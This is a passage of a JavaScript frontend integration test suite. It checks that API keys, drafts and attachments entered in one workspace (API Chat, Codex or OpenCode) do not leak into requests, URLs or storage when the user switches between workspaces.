      "opencode-pocket-codex-thread": SYNTHETIC.cxThreadId,
      "devmoter-device-token": SYNTHETIC.deviceToken,
      "devmoter-api-provider": SYNTHETIC.apiProviderId
    },
    includeVaultProvider: true
  });

  // Step 1: Configure and save an API Chat provider key via real #apiSettingsModal.
  app.auditor.setScope({ nextPhase: "prepare-source", nextTarget: "api", sentinels: [] });
  app.$("#apiSettingsTop").click();
  await waitFor(() => Boolean(app.$(".api-settings-toolbar button")), "API settings list rendered");
  app.$(".api-settings-toolbar button").click();
  await waitFor(() => Boolean(app.$('[data-field="apiKey"]')), "API provider form rendered");

  app.$('[data-field="name"]').value = "Synthetic Custom Secret Provider";
  app.$('[data-field="apiKey"]').value = SYNTHETIC.apiEnteredSecret;
  app.$('[data-field="models"]').value = SYNTHETIC.apiModel;
  app.$("#apiSettingsModal form").dispatchEvent(new app.window.Event("submit", { bubbles: true, cancelable: true }));

  await waitFor(
    () =>
      app.auditor.records.some(r => r.pathname === "/api/llm/providers" && r.method === "POST") &&
      app.$("#apiSettingsModal").classList.contains("hidden") &&
      app.$("#apiProvider").value === SYNTHETIC.apiSavedProviderId,
    "provider saved, refresh finished, and settings modal closed"
  );

  // Send one explicit API Chat turn via the newly saved provider so both its routing and
  // API Chat history sentinels (apiHistoryUser / apiHistoryAssistant) are live in runtime state.
  app.auditor.setScope({
    nextPhase: "explicit-send",
    nextTarget: "api",
    sentinels: [
      { label: "apiEnteredSecret", value: SYNTHETIC.apiEnteredSecret },
      { label: "apiVaultSecretRef", value: SYNTHETIC.apiVaultSecretRef },
      ...ALL_SOURCE_SENTINELS.opencode,
      ...ALL_SOURCE_SENTINELS.codex
    ]
  });
  app.setComposerValue("#apiPrompt", SYNTHETIC.apiHistoryUser);
  const savedProviderSendIdx = app.auditor.records.length;
  app.$("#apiSend").click();
  await waitFor(
    () =>
      app.auditor.records.slice(savedProviderSendIdx).some(r => r.pathname === "/api/llm/chat") &&
      app.$("#apiTranscript").textContent.includes(SYNTHETIC.apiHistoryAssistant) &&
      app.$("#apiForm").getAttribute("aria-busy") === "false",
    "API Chat explicit send via newly saved provider settled"
  );
  const savedChatReq = app.auditor.records.slice(savedProviderSendIdx).find(r => r.pathname === "/api/llm/chat");
  assert.ok(savedChatReq);
  assert.equal(savedChatReq.headers["x-devmoter-device-token"], SYNTHETIC.deviceToken);
  const savedChatPayload = JSON.parse(savedChatReq.body);
  assert.equal(savedChatPayload.providerId, SYNTHETIC.apiSavedProviderId);
  assert.equal(savedChatPayload.projectId, PROJECT_ID);
  assert.deepEqual(savedChatPayload.messages, [{ role: "user", content: SYNTHETIC.apiHistoryUser, attachments: [] }]);
  assert.ok(app.$("#apiHistory").textContent.includes(SYNTHETIC.apiHistoryUser));

  // Reopen form and leave an UNSAVED secret typed in the password input before switching away.
  app.auditor.setScope({ nextPhase: "prepare-source", nextTarget: "api", sentinels: [] });
  app.$("#apiSettingsTop").click();
  await waitFor(() => Boolean(app.$(".api-settings-toolbar button")), "API settings list reopened");
  app.$(".api-settings-toolbar button").click();
  await waitFor(() => Boolean(app.$('[data-field="apiKey"]')), "API provider form reopened");
  app.$('[data-field="apiKey"]').value = SYNTHETIC.apiUnsavedSecret;

  // Step 2: Switch API Chat → Codex and explicitly send on Codex.
  const apiAuthForbidden = [
    ...ALL_SOURCE_SENTINELS.api,
    { label: "apiSavedProviderId", value: SYNTHETIC.apiSavedProviderId },
    ...ALL_SOURCE_SENTINELS.opencode
  ];
  app.auditor.setScope({ nextPhase: "switch", nextTarget: "codex", sentinels: apiAuthForbidden });
  app.$("[data-workspace-menu-button]").click();
  const select = app.$("[data-workspace-backend]");
  select.value = "codex";
  select.dispatchEvent(new app.window.Event("change", { bubbles: true }));
  await waitFor(() => new URL(app.window.location.href).searchParams.get("surface") === "codex", "switched to Codex");
  assert.equal(app.$("#apiSettingsModal").classList.contains("hidden"), true, "API settings modal closes on switch");

  app.auditor.setScope({ nextPhase: "explicit-send", nextTarget: "codex", sentinels: apiAuthForbidden });
  app.setComposerValue("#cxPromptInput", SYNTHETIC.cxSendPrompt);
  const cxStart = app.auditor.records.length;
  app.$("#cxSend").click();
  await waitFor(
    () =>
      app.auditor.records.slice(cxStart).some(r => r.pathname === "/api/codex/rpc" && r.body.includes('"turn/start"')) &&
      app.$("#cxTranscript").textContent.includes("SYNTHETIC_CX_LIVE_REPLY_415"),
    "Codex send after API secret config settled"
  );

  // Step 3: Switch Codex → OpenCode and explicitly send on OpenCode.
  const cxAndApiAuthForbidden = [
    ...ALL_SOURCE_SENTINELS.api,
    { label: "apiSavedProviderId", value: SYNTHETIC.apiSavedProviderId },
    ...ALL_SOURCE_SENTINELS.codex,
    { label: "cxSendPrompt", value: SYNTHETIC.cxSendPrompt }
  ];
  app.auditor.setScope({ nextPhase: "switch", nextTarget: "opencode", sentinels: cxAndApiAuthForbidden });
  select.value = "opencode";
  select.dispatchEvent(new app.window.Event("change", { bubbles: true }));
  await waitFor(() => new URL(app.window.location.href).searchParams.get("surface") === "opencode", "switched to OpenCode");

  app.auditor.setScope({ nextPhase: "explicit-send", nextTarget: "opencode", sentinels: cxAndApiAuthForbidden });
  app.setComposerValue("#ocxPromptInput", SYNTHETIC.ocSentPrompt);
  const ocStart = app.auditor.records.length;
  app.$("#ocxSend").click();
  await waitFor(
    () =>
      app.auditor.records.slice(ocStart).some(r => r.pathname === `/api/opencode/session/${SYNTHETIC.ocSessionId}/prompt`) &&
      !app.$("#ocxSend").classList.contains("stop") &&
      app.$("#ocxTranscript").textContent.includes("SYNTHETIC_OC_LIVE_REPLY_415") &&
      app.auditor.records.slice(ocStart).some(r => r.pathname.endsWith("/question")),
    "OpenCode send after API secret config settled"
  );
  await tick(20);

  // Step 4: Switch back to API Chat via Home React quick-switch shortcut, select Vault-backed provider, and explicitly send.
  const ocAndCxForbiddenForApi = [
    ...ALL_SOURCE_SENTINELS.opencode,
    ...ALL_SOURCE_SENTINELS.codex,
    { label: "cxSendPrompt", value: SYNTHETIC.cxSendPrompt },
    // Browser must NEVER transmit raw API keys or Vault secretRef in /api/llm/chat!
    { label: "apiEnteredSecret", value: SYNTHETIC.apiEnteredSecret },
    { label: "apiUnsavedSecret", value: SYNTHETIC.apiUnsavedSecret },
    { label: "apiVaultSecretRef", value: SYNTHETIC.apiVaultSecretRef }
  ];
  app.auditor.setScope({ nextPhase: "switch", nextTarget: "home", sentinels: ocAndCxForbiddenForApi });
  app.$("[data-workspace-menu-button]").click();
  app.$("[data-workspace-home]").click();
  await waitFor(() => new URL(app.window.location.href).searchParams.get("surface") === "home", "navigated to Home");
  await waitFor(() => Boolean(app.$("[aria-label='Open API Chat workspace']")), "Home React quick-switch rendered");

  app.auditor.setScope({ nextPhase: "switch", nextTarget: "api", sentinels: ocAndCxForbiddenForApi });
  const apiSwitchStartIdx = app.auditor.records.length;
  app.$("[aria-label='Open API Chat workspace']").click();
  await waitFor(
    () =>
      new URL(app.window.location.href).searchParams.get("surface") === "api" &&
      app.auditor.records.slice(apiSwitchStartIdx).some(r => r.pathname === "/api/llm/providers" && r.method === "GET") &&
      app.$("#apiStatus").textContent === "" &&
      Array.from(app.$("#apiProvider").options).some(o => o.value === SYNTHETIC.apiVaultProviderId),
    "Home React quick-switch opened API Chat and provider refresh settled"
  );

  const apiProviderSelect = app.$("#apiProvider");
  apiProviderSelect.value = SYNTHETIC.apiVaultProviderId;
  apiProviderSelect.dispatchEvent(new app.window.Event("change", { bubbles: true }));

  app.auditor.setScope({ nextPhase: "explicit-send", nextTarget: "api", sentinels: ocAndCxForbiddenForApi });
  app.setComposerValue("#apiPrompt", SYNTHETIC.apiSendPrompt);
  const apiSendIdx = app.auditor.records.length;
  app.$("#apiSend").click();
  await waitFor(
    () =>
      app.auditor.records.slice(apiSendIdx).some(r => r.pathname === "/api/llm/chat") &&
      app.$("#apiTranscript").textContent.includes("SYNTHETIC_API_ASSISTANT_REPLY_415") &&
      app.$("#apiForm").getAttribute("aria-busy") === "false",
    "API Chat Vault send"
  );

  const chatReq = app.auditor.records.slice(apiSendIdx).find(r => r.pathname === "/api/llm/chat");
  assert.ok(chatReq);
  assert.equal(chatReq.headers["x-devmoter-device-token"], SYNTHETIC.deviceToken);
  const chatPayload = JSON.parse(chatReq.body);
  assert.equal(chatPayload.providerId, SYNTHETIC.apiVaultProviderId);
  assert.equal(chatPayload.projectId, PROJECT_ID);
  assert.deepEqual(
    chatPayload.messages.map(m => ({ role: m.role, content: m.content })),
    [
      { role: "user", content: SYNTHETIC.apiHistoryUser },
      { role: "assistant", content: SYNTHETIC.apiHistoryAssistant },
      { role: "user", content: SYNTHETIC.apiSendPrompt }
    ]
  );

  // Confirm URL & storage never acquired cross-provider secrets or drafts.
  assert.equal(app.window.location.search.includes(SYNTHETIC.apiEnteredSecret), false);
  assert.equal(app.window.location.search.includes(SYNTHETIC.apiUnsavedSecret), false);
  assert.equal(app.window.localStorage.getItem("opencode-pocket-opencode-session"), SYNTHETIC.ocSessionId);
  assert.equal(app.window.localStorage.getItem("opencode-pocket-codex-thread"), SYNTHETIC.cxThreadId);

  assert.deepEqual(app.auditor.violations, [], `Unexpected boundary violations:\n${app.auditor.violations.join("\n")}`);
  app.assertNoNonHttpLeaks();
});

test("Home React quick-switch shortcuts isolate OpenCode and Codex drafts/attachments across round-trip sends", async t => {
  const app = await mountRealFrontend(t, {
    initialUrl: `${ORIGIN}/?surface=opencode&unifiedUI=1`,
    localStorageSeed: {
      "opencode-pocket-backend": "opencode",
      "opencode-pocket-project": PROJECT_ID,
      "opencode-pocket-opencode-session": SYNTHETIC.ocSessionId,
      "opencode-pocket-codex-thread": SYNTHETIC.cxThreadId,
      "devmoter-device-token": SYNTHETIC.deviceToken,
      "devmoter-api-provider": SYNTHETIC.apiProviderId
    }
  });

  // Put draft + pending attachment on OpenCode.
  app.auditor.setScope({ nextPhase: "prepare-source", nextTarget: "opencode", sentinels: [] });
  app.setComposerValue("#ocxPromptInput", SYNTHETIC.ocUnsentDraft);
  await app.attachFile("#ocxFileInput", {
    name: SYNTHETIC.ocAttachName,
    mime: "text/plain",
    content: SYNTHETIC.ocAttachBody
  });
  await waitFor(() => app.$("#ocxAttachmentStrip").textContent.includes(SYNTHETIC.ocAttachName), "OC attachment ready");

  // Go to Home via drawer brand button, then switch to Codex via React shortcut.
  const ocForbidden = ALL_SOURCE_SENTINELS.opencode;
  app.auditor.setScope({ nextPhase: "switch", nextTarget: "home", sentinels: ocForbidden });
  app.$("[data-workspace-menu-button]").click();
  app.$("[data-workspace-home]").click();
  await waitFor(() => Boolean(app.$("[aria-label='Open Codex workspace']")), "Home React shortcuts rendered");

  app.auditor.setScope({ nextPhase: "switch", nextTarget: "codex", sentinels: ocForbidden });
  app.$("[aria-label='Open Codex workspace']").click();
  await waitFor(() => new URL(app.window.location.href).searchParams.get("surface") === "codex", "React shortcut opened Codex");
  assert.equal(app.$("#cxPromptInput").value, "");
  assert.equal(app.$("#cxAttachmentStrip").children.length, 0);

  // Send on Codex, then put Codex draft + attachment and switch via Home React shortcut -> OpenCode.
  app.auditor.setScope({ nextPhase: "explicit-send", nextTarget: "codex", sentinels: ocForbidden });
  app.setComposerValue("#cxPromptInput", SYNTHETIC.cxSendPrompt);
  const cxStart = app.auditor.records.length;
  app.$("#cxSend").click();
  await waitFor(
    () =>
      app.auditor.records.slice(cxStart).some(r => r.pathname === "/api/codex/rpc" && r.body.includes('"turn/start"')) &&
      app.$("#cxTranscript").textContent.includes("SYNTHETIC_CX_LIVE_REPLY_415"),
    "Codex send settled"
  );

  app.auditor.setScope({ nextPhase: "prepare-source", nextTarget: "codex", sentinels: [] });
  app.setComposerValue("#cxPromptInput", SYNTHETIC.cxUnsentDraft);
  await app.attachFile("#cxFileInput", {
    name: SYNTHETIC.cxAttachName,
    mime: "text/plain",
    content: SYNTHETIC.cxAttachBody
  });
  await waitFor(() => app.$("#cxAttachmentStrip").textContent.includes(SYNTHETIC.cxAttachName), "Codex attachment ready");

  const cxForbidden = [
    ...ALL_SOURCE_SENTINELS.codex,
    { label: "cxSendPrompt", value: SYNTHETIC.cxSendPrompt }
  ];
  app.auditor.setScope({ nextPhase: "switch", nextTarget: "home", sentinels: cxForbidden });
  app.$("[data-workspace-menu-button]").click();
  app.$("[data-workspace-home]").click();
  await waitFor(() => new URL(app.window.location.href).searchParams.get("surface") === "home", "returned to Home");

  app.auditor.setScope({ nextPhase: "switch", nextTarget: "opencode", sentinels: cxForbidden });
  app.$("[aria-label='Open OpenCode workspace']").click();
  await waitFor(() => new URL(app.window.location.href).searchParams.get("surface") === "opencode", "React shortcut opened OpenCode");

  // OpenCode still has its own draft/attachment and sends ONLY OpenCode data.
  assert.equal(app.$("#ocxPromptInput").value, SYNTHETIC.ocUnsentDraft);
  app.auditor.setScope({ nextPhase: "explicit-send", nextTarget: "opencode", sentinels: cxForbidden });
  const ocStart = app.auditor.records.length;
  app.$("#ocxSend").click();
  await waitFor(
    () => app.auditor.records.slice(ocStart).some(r => r.pathname === `/api/opencode/session/${SYNTHETIC.ocSessionId}/prompt`),
    "OpenCode send via Home shortcut"
  );
  const ocBody = JSON.parse(app.auditor.records.slice(ocStart).find(r => r.pathname.endsWith("/prompt")).body);
  assert.ok(ocBody.text.includes(SYNTHETIC.ocUnsentDraft));
  assert.ok(ocBody.text.includes(`devmoter-upload:${SYNTHETIC.ocUploadId}`));

  assert.deepEqual(app.auditor.violations, [], `Unexpected boundary violations:\n${app.auditor.violations.join("\n")}`);
  app.assertNoNonHttpLeaks();
});
